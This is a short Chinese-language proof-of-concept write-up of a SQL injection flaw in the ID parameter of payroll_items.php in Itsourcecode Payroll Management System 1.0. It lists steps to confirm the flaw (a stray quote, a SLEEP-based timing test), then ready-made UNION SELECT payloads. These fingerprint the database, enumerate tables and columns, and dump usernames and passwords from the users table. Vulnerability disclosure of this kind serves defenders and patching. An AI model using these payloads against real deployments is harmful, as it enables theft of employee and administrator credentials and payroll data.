验证漏洞存在方法
    - 访问payroll_items.php页面，观察是否存在ID参数
    - 尝试在ID参数后添加单引号(')，观察是否出现SQL错误信息
    - 使用时间延迟注入测试：在ID参数后添加' AND SLEEP(5)--，观察响应时间是否延迟

漏洞利用方法
    - 该漏洞存在于Itsourcecode Payroll Management System 1.0的payroll_items.php文件中，通过ID参数存在SQL注入漏洞
    - 攻击者可以通过构造恶意的SQL查询语句来执行任意SQL命令
    - 由于是SQL注入漏洞，攻击者可以尝试提取数据库信息、管理员凭据等敏感数据
    
PoC示例：
    - 基础注入测试：`payroll_items.php?id=1'`
    - 联合查询注入：`payroll_items.php?id=1' UNION SELECT 1,2,3,4,5--`
    - 数据库信息提取：`payroll_items.php?id=1' UNION SELECT 1,database(),user(),version(),5--`
    - 表名提取：`payroll_items.php?id=1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--`
    - 列名提取：`payroll_items.php?id=1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--`
    - 数据提取：`payroll_items.php?id=1' UNION SELECT 1,username,password,4,5 FROM users--`
